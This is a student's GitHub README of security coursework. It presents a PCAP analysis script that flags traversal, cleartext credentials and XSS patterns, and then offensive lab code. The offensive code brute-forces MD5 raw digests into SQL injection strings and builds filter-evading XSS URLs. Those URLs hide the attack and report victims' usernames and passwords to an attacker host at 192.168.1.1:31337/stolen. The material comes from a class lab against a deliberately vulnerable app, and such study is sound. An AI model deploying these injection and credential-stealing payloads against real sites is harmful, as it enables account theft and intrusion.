# Project highlights from 52600
## 📂 [\[ 1 \] C Vulnerabilities](https://github.com/plmcdowe/52600/tree/f359f56ece8bba40cd979996ab1ae614025c0368/1-C-Vulnerabilities)
### 🚧
## 📂 [\[ 2a \] JSON PCAP Parser](https://github.com/plmcdowe/52600/tree/f359f56ece8bba40cd979996ab1ae614025c0368/2a-JSON-PCAP-Parser)
Due to the nature of the assignment, there are two separate files: <i>part1.py</i> and <i>part2.py</i>.    
They could easily be combined and extended to handle other cases.    
Both parse for indicators of security events in PCAP files.     
I elected to export the PCAP as JSON and simply parse the captures by *key*:*value* pairs instead of using a PCAP library.    
### [part1.py](https://github.com/plmcdowe/52600/blob/f359f56ece8bba40cd979996ab1ae614025c0368/2a-JSON-PCAP-Parser/part1.py) parses for:
> <b><ins><i>Successful</i> HTTP sessions</ins>:</b>
>> ```python
>>     http_sessions = []
>>     if var_HTTP_sessions.get():
>>         with open('HTTP_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             examiner_writer.writerow(['Webserver IP with valid HTTP session:'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 http = layers.get('http', {})
>> 
>>                 for key in http.keys():
>>                     if key.startswith('HTTP/') and 'http.response.code' in http[key]:
>>                         code = http[key].get('http.response.code', {})
>>                         if code:
>>                             if ip_src not in http_sessions:
>>                                 http_sessions.append(ip_src)
>> 
>>             http_sessions.sort(key=lambda ip: tuple(map(int, ip.split('.'))))
>>             num_columns = 6
>>             for ip in range(0, len(http_sessions), num_columns):
>>                 chunk = http_sessions[ip:ip + num_columns]
>>                 examiner_writer.writerow(chunk)
>> ```
>> 
> <b><ins>Directory Traversal evidence</ins>:</b>
>> ```python
>>     if var_traversal.get():
>>         with open('TRAVERSAL_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame_num = layers.get('frame', {}).get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 http_req_uri = layers.get('http', {}).get('http.request.full_uri')
>> 
>>                 if http_req_uri is not None and '../..' in http_req_uri:
>>                     examiner_writer.writerow([f'FRAME: {frame_num}; REQUESTING IP: {ip_src}; SERVER IP: {ip_dst}'])
>>                     examiner_writer.writerow([f'Possible traversal in URI: {http_req_uri}'])
>>                     examiner_writer.writerow(['\n'])
>> ```
>> 
> <b><ins>Failed login attempts</ins>:</b>
>> ```python
>>     if var_login.get():
>>         with open('LOGIN_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame_num = layers.get('frame', {}).get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>> 
>>                 ftp = layers.get('ftp', {})
>> 
>>                 for key in ftp.keys():            
>>                     if key.startswith('USER '):
>>                         ftp_request_uname = ftp.get(key, {})
>>                         ftp_uname = ftp_request_uname.get('ftp.request.arg', {})
>>                         examiner_writer.writerow([f'USER: {ftp_uname}'])
>>                         examiner_writer.writerow([f'FRAME: {frame_num}; SRC IP: {ip_src}; DST IP: {ip_dst}'])
>> 
>>                     if key.startswith(('331 ', '503 ')):
>>                         ftp_resp = ftp[key].get('ftp.response.arg', {})
>>                         examiner_writer.writerow([f'FTP response: {ftp_resp}'])
>>                         examiner_writer.writerow([f'FRAME: {frame_num}; SRC IP: {ip_src}; DST IP: {ip_dst}'])
>> 
>>                     if key.startswith('530'):
>>                         ftp_resp = key
>>                         examiner_writer.writerow([f'FTP response: {ftp_resp}'])
>>                         examiner_writer.writerow([f'FRAME: {frame_num}; SRC IP: {ip_src}; DST IP: {ip_dst}'])
>> 
>>                     if key.startswith('PASS '):
>>                         ftp_request_pass = ftp.get(key, {})
>>                         ftp_pass = ftp_request_pass.get('ftp.request.arg', {})
>>                         examiner_writer.writerow([f'PASSWORD: {ftp_pass}'])
>>                         examiner_writer.writerow([f'FRAME: {frame_num}; SRC IP: {ip_src}; DST IP: {ip_dst}'])
>> ```
>> 
> <b><ins>Clear text credentials in Telnet</ins>:</b>
>> ```python
>>     telnet_scrape = []
>>     if var_credentials.get():
>>         with open('TELNET_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 telnet = layers.get('telnet', {})
>> 
>>                 for key in telnet.keys():
>>                     if key.endswith('.data'):
>>                         telnet_data = telnet.get(key, {})
>>                         telnet_scrape.append(telnet_data)
>>             examiner_writer.writerow([f'Clear text credentials found here:'])
>>             examiner_writer.writerow([f'{telnet_scrape}'])
>>             examiner_writer.writerow(['\n'])
>> 
>>             clean = lambda x: ''.join([i.strip() for i in [regex.sub(r'[^\x20-\x7E]', '', item) for item in x]])
>>             credentials = clean(telnet_scrape)
>>             examiner_writer.writerow([f'{credentials}'])
>> ```
>> 
> <b><ins>Apache webserver versions</ins>:</b>
>> ```python
>>     apache_ver = {}
>>     if var_apache.get():
>>         with open('APACHE_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 http_srv = layers.get('http', {}).get('http.server', {})
>> 
>>                 if 'Apache/' in http_srv:
>>                     version = regex.findall(r'(?:Apache/?)(\d.\d{1,3}(?:.\d{1,3}))', http_srv)
>>                     for v in version:
>>                         if v not in apache_ver.values():
>>                             apache_ver[ip_src] = [v]      
>> 
>>             sorted_ver = dict(sorted(apache_ver.items(), key = lambda item: tuple(map(int, item[1][0].split('.')))))
>> 
>>             for ip, ver in sorted_ver.items():
>>                 examiner_writer.writerow([f'Apache server IP: {ip}', f'VERSION: {ver}'])
>> ```
>> 
> <b><ins>DNS source port randomization</ins>:</b>
>> ```python
>>     query_clients = {}
>>     if var_DNS_ports.get():
>>         with open('DNS_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 dns_resp_flag = layers.get('dns', {}).get('dns.flags_tree', {}).get('dns.flags.response')
>>                 udp_src = layers.get('udp', {}).get('udp.srcport')
>> 
>>                 if dns_resp_flag == '0':
>>                     if ip_src in query_clients:
>>                         query_clients[ip_src]['ports'].add(udp_src)
>>                         query_clients[ip_src]['count'] += 1
>>                     else:
>>                         query_clients[ip_src] = {'ports': {udp_src}, 'count': 1}
>> 
>>             for ip_src, val in query_clients.items():
>>                 if len(val['ports']) == 1 and val['count'] > 1:
>>                     examiner_writer.writerow([f'CLIENT IP: {ip_src}; UDP PORT: {list(val["ports"])[0]}; COUNT: {val["count"]}'])
>> ```
>> 
> <b><ins>TCP ISN deviation</ins>:</b>
>> ```python
>>     client_seq = {}
>>     if var_TCP_sequences.get():
>>         with open('CLIENT_TCP_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 tcp_seq = layers.get('tcp', {}).get('tcp.seq_raw', None)
>> 
>>                 if tcp_seq is not None:
>>                     if ip_src in client_seq:
>>                         client_seq[ip_src].append(tcp_seq)
>>                     else:
>>                         client_seq[ip_src] = [tcp_seq]
>> 
>>             tcp_deviation = {}
>>             for ip_src, tcp_seq in client_seq.items():
>>                 if len(tcp_seq) >= 5:
>>                     int_tcp_seq  = [int(x) for x in tcp_seq]
>>                     std_dev = statistics.stdev(int_tcp_seq)
>>                     tcp_deviation[ip_src] = [std_dev]
>> 
>>             sort_deviation = dict(sorted(tcp_deviation.items(), key=lambda item: item[1][0], reverse=True))
>>             top_two = list(sort_deviation.keys())[:2]
>>             for client in top_two:
>>                 examiner_writer.writerow([f'CLIENT IP: {client}', f'STANDARD DEVIATION: {sort_deviation[client][0]}'])
>> ```
>> 
> <b><ins>Traceroute evidence</ins>:</b>
>> ```python
>>     traceroute_src = {}
>>     if var_traceroute.get():
>>         with open('TRACEROUTE_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame_num = layers.get('frame', {}).get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 ip_ttl = layers.get('ip', {}).get('ip.ttl')
>>                 udp_src = layers.get('udp', {}).get('udp.srcport')
>> 
>>                 if ip_ttl is not None and int(ip_ttl) < 64:  
>>                     if udp_src is not None and int(udp_src) >= 33434:  
>>                         if ip_src in traceroute_src:
>>                             traceroute_src[ip_src].append((ip_dst, frame_num))
>> 
>>                         else:
>>                             traceroute_src[ip_src] = [(ip_dst, frame_num)]
>> 
>>             for src, val_list in traceroute_src.items():
>>                 examiner_writer.writerow([f'Possible source of traceroute: {src}, with '+str(len(val_list))+' occurrences'])
>>                 for dest, frame in val_list:
>>                     examiner_writer.writerow([f'Source: {src}, with destination: {dest}, in frame: {frame}'])
>>             examiner_writer.writerow(['\n'])
>> ```
>> 
> <b><ins>XSS evidence</ins>:</b>
>> ```python
>>     xss_RedFlags = {'<' : 1,
>>                     '>' : 1,
>>                     'script' : 1,
>>                     '%3C' : 2,
>>                     '%3E' : 2,
>>                     '.cookie' : 5,
>>                     'test' : 10,
>>                     '%22' : 10,
>>                     'alert(' : 10,
>>                     '%253C' : 10,
>>                     '%253E' : 10,
>>                     '&#60;': 10,
>>                     '&#62;' : 10,
>>                     '(String.fromCharCode(' : 20,
>>                     'eval(atob(' : 20,
>>                     '.nasl' : 30
>>                     }
>>     if var_cross_site.get():
>>         with open('XSS_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             matches = []
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame_num = layers.get('frame', {}).get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 http_req_uri = layers.get('http', {}).get('http.request.full_uri')
>> 
>>                 score = sum(weight * http_req_uri.count(pattern) for pattern, weight in xss_RedFlags.items()
>>                             if http_req_uri is not None and pattern in http_req_uri)
>> 
>>                 if score > 0:
>>                     matches.append((score, frame_num, ip_src, ip_dst, http_req_uri))
>> 
>>             for score, frame_num, ip_src, ip_dst, http_req_uri in sorted(matches, reverse=True):
>>                 examiner_writer.writerow([f'XSS PATERN FOUND IN FRAME NUMBER: {frame_num}; REQUESTING IP: {ip_src}; SERVER IP: {ip_dst}; SCORE: {score}'])
>>                 examiner_writer.writerow([f'{http_req_uri}'])
>> ```
>> 
> <b><ins>A tkinter filedialog</ins>:
>> \- Prompts the user to open the JSON PCAP file,      
>> \- Then lists check-boxes, allowing the user to:    
>>> \+ select what functions to run,    
>>> \+ and whether to run again when complete</b>   
>>
>> ```python
>> def main():
>>     root = tk.Tk()
>>     root.withdraw()
>> 
>>     filename = filedialog.askopenfilename(title="Select a file", filetypes=[("JSON files", "*.json"), ("All files", "*.*")])
>> 
>>     if filename:
>> 
>>         with open(filename, 'r', encoding='utf-8') as pcap:
>>             ingest = json.load(pcap)
>>             
>>             root = tk.Tk()
>>             tk.Label(root, text = 'Make one or more selections:').pack(pady=10)
>> 
>>             var_HTTP_sessions =     tk.IntVar(value=0, master=root)
>>             var_traversal =         tk.IntVar(value=0, master=root)
>>             var_login =             tk.IntVar(value=0, master=root)
>>             var_credentials =       tk.IntVar(value=0, master=root)
>>             var_apache =            tk.IntVar(value=0, master=root)
>>             var_DNS_ports =         tk.IntVar(value=0, master=root)
>>             var_TCP_sequences =     tk.IntVar(value=0, master=root)
>>             var_traceroute =        tk.IntVar(value=0, master=root)
>>             var_cross_site =        tk.IntVar(value=0, master=root)
>> 
>>             ttk.Checkbutton(root, text = 'Examine HTTP sessions',           variable = var_HTTP_sessions).pack(anchor='w')            
>>             ttk.Checkbutton(root, text = 'Possible directory traversals',   variable = var_traversal).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'Failed login attempts',           variable = var_login).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'Clear text credentials',          variable = var_credentials).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'Apache webserver versions',       variable = var_apache).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'DNS source port randomization',   variable = var_DNS_ports).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'TCP ISN deviation',               variable = var_TCP_sequences).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'Traceroute evidence',             variable = var_traceroute).pack(anchor='w')
>>             ttk.Checkbutton(root, text = 'Possible XSS events',             variable = var_cross_site).pack(anchor='w')
>>             
>>             ttk.Button(root, text='Execute Selected Functions', command = lambda: [execute_functions(pcap, ingest,
>>                                                                                                     var_HTTP_sessions,
>>                                                                                                     var_traversal,
>>                                                                                                     var_login,
>>                                                                                                     var_credentials,
>>                                                                                                     var_apache,
>>                                                                                                     var_DNS_ports,
>>                                                                                                     var_TCP_sequences,
>>                                                                                                     var_traceroute,
>>                                                                                                     var_cross_site), re_execute(root)]).pack(pady=10)            
>>             root.mainloop()
>>     else:
>>         print("No file selected")
>>         sys.exit()
>> 
>> def re_execute(root):
>>     root.destroy()
>> 
>>     run_again = messagebox.askyesno(title='', message='Would you like to run another function?')
>>     if run_again:
>>         main()
>>     if not run_again:
>>         sys.exit()
>> 
>> if __name__ == "__main__":
>>     main()
>> ```
>
### [part2.py](https://github.com/plmcdowe/52600/blob/f359f56ece8bba40cd979996ab1ae614025c0368/2a-JSON-PCAP-Parser/part1.py) parses for:    
> **Client MAC & IP addresses**
>> ```python
>>     mdns_ptr = {}
>>     src_clients = {}
>>     if var_client_MAC_IP.get():
>>         with open('CLIENT_MAC_IP_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 src_mac = layers.get('eth', {}).get('eth.src')
>>                 src_oui = layers.get('eth', {}).get('eth.src_tree').get('eth.src.oui_resolved')
>>                 dns_resp_flag = layers.get('dns', {}).get('dns.flags_tree', {}).get('dns.flags.response')
>>                 mdns_ans = layers.get('mdns', {}).get('Answers', {})
>>                 dhcp_hw_mac = layers.get('dhcp', {}).get('dhcp.hw.mac_addr')
>>                 dhcp6 = layers.get('dhcpv6', {})
>>                 http = layers.get('http', {})
>> 
>>                 if ip_src is not None and ip_src.startswith('10.'):
>>                     if src_mac not in src_clients:
>>                         src_clients[src_mac] = {'src_ip': {ip_src}, 'dns_count': 0, 'dhcp_count': 0, 'http_count': 0, 'src_oui': src_oui}
>>                     else:
>>                         src_clients[src_mac]['src_ip'].add(ip_src)
>> 
>>                 if dns_resp_flag == '1':
>>                     if src_mac in src_clients:
>>                         src_clients[src_mac]['src_ip'].add(ip_src)
>>                         src_clients[src_mac]['dns_count'] += 1
>>                     else:
>>                         src_clients[src_mac] = {'src_ip': {ip_src}, 'dns_count': 1, 'dhcp_count': 0, 'http_count': 0, 'src_oui': src_oui}
>> 
>>                 if src_mac is not None and dhcp_hw_mac is not None and src_mac in dhcp_hw_mac:
>>                     if src_mac in src_clients:
>>                         src_clients[src_mac]['dhcp_count'] += 1
>>                     else:
>>                         src_clients[src_mac] = {'src_ip': {ip_src}, 'dns_count': 0, 'dhcp_count': 1, 'http_count': 0, 'src_oui': src_oui}
>> 
>>                 for key in http.keys():
>>                     http_resp = http[key]
>>                     if isinstance(http_resp, dict):
>>                         http_resp = http_resp.get('http.response.code', '')
>>                         if src_mac is not None and http_resp != '':
>>                             if src_mac in src_clients:
>>                                 src_clients[src_mac]['http_count'] += 1
>>                             else:
>>                                 src_clients[src_mac] = {'src_ip': {ip_src}, 'dns_count': 0, 'dhcp_count': 0, 'http_count': 1, 'src_oui': src_oui}
>>                                
>>                 for key in mdns_ans:
>>                     mdns_name = mdns_ans[key].get('dns.ptr.domain_name', '')
>>                     if mdns_name != '':                        
>>                         name = regex.findall(r'(?!\s)(\D{2,}.*o)(?:\.)', mdns_name)
>>                         if src_mac not in mdns_ptr:
>>                             mdns_ptr[src_mac] = name
>> 
>>             for src_mac, val in src_clients.items():
>>                 if len(val['src_ip']) >= 1 and val['dns_count'] >= 0 and val['dhcp_count'] >= 0 and val['http_count'] >=0:
>>                     examiner_writer.writerow([f'SRC MAC: {src_mac}; SRC IP: {list(val["src_ip"])[0]}; DNS RESPs: {val["dns_count"]}; DHCP RESPs: {val["dhcp_count"]}; HTTP RESPs: {val["http_count"]};  OUI: {val["src_oui"]}'])
>>                     if src_mac in mdns_ptr:
>>                         examiner_writer.writerow([f'CLIENT MAC: {src_mac} == {mdns_ptr[src_mac][0]}'])
>> 
>>             examiner_writer.writerow(['\n'])
>> ```
>> 
> **FTP session details**
>> ```python
>>     ftp_srv = {}
>>     ftp_ips = set()
>>     if var_FTP_hostname.get():
>>         with open('FTP_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame_num = layers.get('frame', {}).get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 ip_dst = layers.get('ip', {}).get('ip.dst')
>>                 src_mac = layers.get('eth', {}).get('eth.src')
>>                 dst_mac = layers.get('eth', {}).get('eth.dst')
>> 
>>                 ftp = layers.get('ftp', {})
>>                 ftp_request = ftp.get('ftp.request', {})
>>                 ftp_response = ftp.get('ftp.response', {})
>> 
>>                 if ftp_request == '1':
>>                     examiner_writer.writerow([f'FTP REQUEST IN - FRAME: {frame_num}; SRC IP: {ip_src} & SRC MAC: {src_mac}; DST IP: {ip_dst} & DST MAC: {dst_mac}'])
>> 
>>                     for key in ftp.keys():
>>                         ftp_get = ftp.get(key, {})
>>                         if isinstance(ftp_get, dict):
>>                             ftp_req_cmd = ftp[key].get('ftp.request.command', '')
>>                             examiner_writer.writerow([f'FTP request.command: {ftp_req_cmd}'])
>> 
>>                             ftp_req_arg = ftp[key].get('ftp.request.arg', '')
>>                             if ftp_req_arg != '':
>>                                 examiner_writer.writerow([f'FTP request.arg: {ftp_req_arg}'])
>>                                 
>>                     examiner_writer.writerow(['\n'])                    
>>                 if ftp_request == '0':
>>                     examiner_writer.writerow([f'FTP RESPONSE IN - FRAME: {frame_num}; SRC IP: {ip_src} & SRC MAC: {src_mac}; DST IP: {ip_dst} & DST MAC: {dst_mac}'])
>> 
>>                     for key in ftp.keys():
>>                         ftp_get = ftp.get(key, {})
>>                         if isinstance(ftp_get, dict):
>>                             ftp_resp_code = ftp[key].get('ftp.response.code', '')
>>                             examiner_writer.writerow([f'FTP response.code: {ftp_resp_code}'])
>> 
>>                             if key.startswith('220 '):
>>                                 ftp_srv[ip_src] = [frame_num, src_mac, ip_dst, dst_mac]
>>                                 ftp_ips.add(ip_src)
>>                             ftp_resp_arg = ftp[key].get('ftp.response.arg', '')
>>                             if ftp_resp_arg != '':
>>                                 examiner_writer.writerow([f'FTP response.arg: {ftp_resp_arg}'])
>> 
>>                     examiner_writer.writerow(['\n'])                 
>>             for ip_src, ftp_list in ftp_srv.items():
>>                 examiner_writer.writerow([f'FTP connection in frame: {ftp_list[0]}; FTP IP: {ip_src} & FTP MAC: {ftp_list[1]}; Client IP: {ftp_list[2]} & Client MAC: {ftp_list[3]}'])
>> 
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 dns = layers.get('dns', {})
>>                 dns_answer = dns.get('Answers', {})     
>> 
>>                 for key, value in dns_answer.items():
>>                     dns_a = value.get('dns.a', '').strip()
>>                     if dns_a in ftp_ips:  
>>                         dns_ns = value.get('dns.resp.name', {})
>>                         examiner_writer.writerow([f'FTP server hostname is: {dns_ns}'])
>>                         examiner_writer.writerow(['\n'])
>> ```
>> 
> **Facebook URIs & cookies**
>> ```python
>>     if var_facebook.get():
>>         with open('FACEBOOK_examiner.csv', mode='a', newline='') as examiner_csv:
>>             examiner_writer = csv.writer(examiner_csv, delimiter=',')
>>             ct = datetime.datetime.now()
>>             examiner_writer.writerow([f'Examined at: {ct}'])
>>             for packet in ingest:
>>                 source = packet.get('_source', {})
>>                 layers = source.get('layers', {})
>>                 frame = layers.get('frame', {})
>>                 frame_num = frame.get('frame.number')
>>                 ip_src = layers.get('ip', {}).get('ip.src')
>>                 src_mac = layers.get('eth', {}).get('eth.src')
>> 
>>                 http = layers.get('http', {})
>>                 http_host = http.get('http.host')
>>                 http_request = http.get('http.request.line')
>>                 http_cookie = http.get('http.cookie')
>>                 http_req_uri = http.get('http.request.full_uri') 
>> 
>>                 if http_host is not None and 'facebook' in http_host:
>>                     if http_cookie is not None:
>>                         examiner_writer.writerow([f'FRAME NUMBER: {frame_num}; Client IP: {ip_src}; Client MAC: {src_mac}'])
>>                         decoded = unquote(http_cookie)
>>                         examiner_writer.writerow([f'FACEBOOK COOKIE: {decoded}'])
>> 
>>                 if http_req_uri is not None and 'facebook' in http_req_uri:
>>                     examiner_writer.writerow([f'FRAME NUMBER: {frame_num}; Client IP: {ip_src}; Client MAC: {src_mac}'])
>>                     decoded = unquote(http_req_uri)
>>                     examiner_writer.writerow([f'FACEBOOK URI: {decoded}'])
>> ```
>> 
>   
## 📂 [\[ 2b \] SQL-XSS-CSRF](https://github.com/plmcdowe/52600/tree/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF)
### [sql2_md5.py](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/sql2_md5.py)
> **This program was created and ran on my WIN11 machine, using python v 3.11.3**    
> **I elected to use hashlib since it is part of the Standard Library. I included time for curiosities sake.**    
> **For simplicity, the input string to be hashed is just an incrementing `int` (str_in), converted to `str`.**
>> ```python
>> def hasher(inject):
>>     start_time = time.time()
>>     str_in = 0
>>     while True:
>>         str_in += 1 # increment str_in by 1, each loop
>>         
>>         m = hashlib.md5() # instantiate the md5 function as `m`
>> ```
>
> **From: [/manual/function.md5.php](https://www.php.net/manual/en/function.md5.php) I learned that `md5( ,true);` returns "the md5 digest in raw binary format."**    
> **Raw binary can contain any byte value!     
> Meaning that a particular hash may contain a certain, desired substring.**
>> ```python
>>        m.update(str(str_in).encode())
>>        
>>        d = m.digest() # `digest()` returns the bytes object "digest" from `update()` containing binary encoded hexadecimal characters.
>> ```
> **I had no clue how long it would take to iterate hashes until the raw binary contained a valid injection substring - but I did know that the shorter I could make it, the better, so:**     
>
> **Starting with: `'OR "1"="1"'` then a few (many) rounds of blind elimination -**    
> **I determined that '=' was the smallest inject in sql_0 that I could use to sign in as victim.**     
>> ```python
>>        if inject.encode() in d: # 'encode' the str `inject` for comparison of bytes in `d` digest.
>>            print(f'inject: [ {str_in} ] | from: [ {d} ] | time: [ {time.time() - start_time} ]')
>>            break
>> ```
> **I was pleasantly surprised by the results:**    
> **"inject: [ 1839431 ] | from: [ b"\xc37\x90\xa5\xaf\xc4\xb1A@J\xbe'='\xaa\xa9" ] | time: [ 1.2804677486419678 ]"**    
>> ```python
>> if __name__ == '__main__':
>>    # slice `hasher.py` from sys.argv and join on space, store in inject
>>    inject = ' '.join(sys.argv[1:])    
>>    hasher(inject)
>> ```
>     
> **I decided to implement user input ASCII injection strings (from CLI with `sys`) for encoding.**    
> **The first string I tried was `'or 1=1#` but, I killed the process after a couple of minutes.**    
> **The second string I tried was `'='#` but, I similarly killed the process.**    
> **While hardly scientific, this proved to be a practical example of "Avalanching"**    

### [xss_payload.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/xss_payload.html)
> **The goal was to construct URLs that execute a Cross Site payload in four defense cases 0 - 3.**    
> **<ins>Additionally, we needed to meet the following criteria</ins>:**    
>> ***Stealth*:**    
>>> **\- "Display all pages correctly, with no significant evidence of attack."**    
>>> **\- "Display normal URLs in the browser's location bar, with no evidence of attack."**     
>>> **\- "Hide evidence of attack in the *Bungle!* search history view as long as your code is running."**    
>>
>> ***Persistence*:**     
>>> **\- "Continue the attack if the user navigates to another *Bungle!* page by:**     
>>>> **link, form submission, and logging in or out."**    
>>>
>>> **\- "Continue the attack if the user navigates to another *Bungle!* page by:**
>>>> **using the browser's back or forward buttons."**    
>>
>> ***Spying*:**     
>>> **\- "Report all login and logout events by loading the URLs:"**    
>>>> \- `http://192.168.1.1:31337/stolen?event=login&user=<username>&pass=<password>`    
>>>> \- `http://192.168.1.1:31337/stolen?event=logout&user=<username>`     
>>>
>>> **\- "Report each page that is displayed (what the user thinks they are seeing) by loading the url:"**    
>>>> \- `http://192.168.1.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>`     
> 
> **For the sake of space, I won't break out all of `xss_payload.html` here.**    
> **Comments throughout source should associate the purpose of functions with the criteria listed above.**    
>
> **Below is snip of the HTML `<style>` to generate a reasonably benign looking site; and, a snip of the functions which generate the payloads as links in each of the icons found in the screen shot after the code.**     
>> ```html
>> <meta charset="utf-8">
>> <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
>> <style>
>> body {background-image: url("https://i.imgur.com/GpCfuFQ.png");background-repeat: no-repeat;background-size: 25% auto;background-position: left top;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
>> .links-container {display: flex;justify-content: space-between;align-items: center;flex-wrap: wrap;padding: 20px;border: 2px solid black;width: 80%;}
>> .flex-item {width: 100px;height: 100px;margin: 10px;border: 1px solid black;text-align: center;line-height: 100px;}
>> h3 a {color: black;}
>> </style>
>> <script>
>> function payload(attacker){
>> //.
>> // cut for space
>> //.
>> );
>> }
>> $("html").hide();
>> ldP("./");
>> }
>> function ncdSTR(query){                                                             // FUNCTION TO ENCODE STRINGS
>>     var myRe=/".*?"/g;var match;                                                    // MATCH ALL BETWEEN DOUBLE QUOTES
>>     while((match=myRe.exec(query))!==null){
>>         var ncdedSTR="";
>>         for(var idx=1;idx<match[0].length-1;++idx){
>>             ncdedSTR+=match[0].charCodeAt(idx)+",";}
>>         ncdedSTR=ncdedSTR.slice(0,-1);
>>         ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
>>         query=query.replace(match[0],ncdedSTR);}return query;}  
>> function mkLnk(xssdefense,target,atkr){                                              // DIVIDE OUT THE BASE URL FROM THE PAYLOAD QUERY
>>     var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
>>     var payLd=payload.toString()+";payload(\""+atkr+"\");";
>>     switch(xssdefense){                                                              // CASES FOR URL CONSTRUCTION BASED ON DEFENSES 0-3
>>     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
>>     case 1:
>>     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
>>     case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
>> const target = "http://526.edu/project2b/";
>> const atkr =  "http://192.168.1.1:31337/";
>> $(function(){
>>     var container = $("<div></div>").addClass("links-container");                    // GENERATE CONTAINER LINKS FOR EACH OF THE FOUR DEFENSE LEVELS 0-3 WITH SWITCH CASE
>>     for(var xssdefense=0;xssdefense<=3;xssdefense++){
>>         var url=mkLnk(xssdefense,target,atkr);
>>         container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
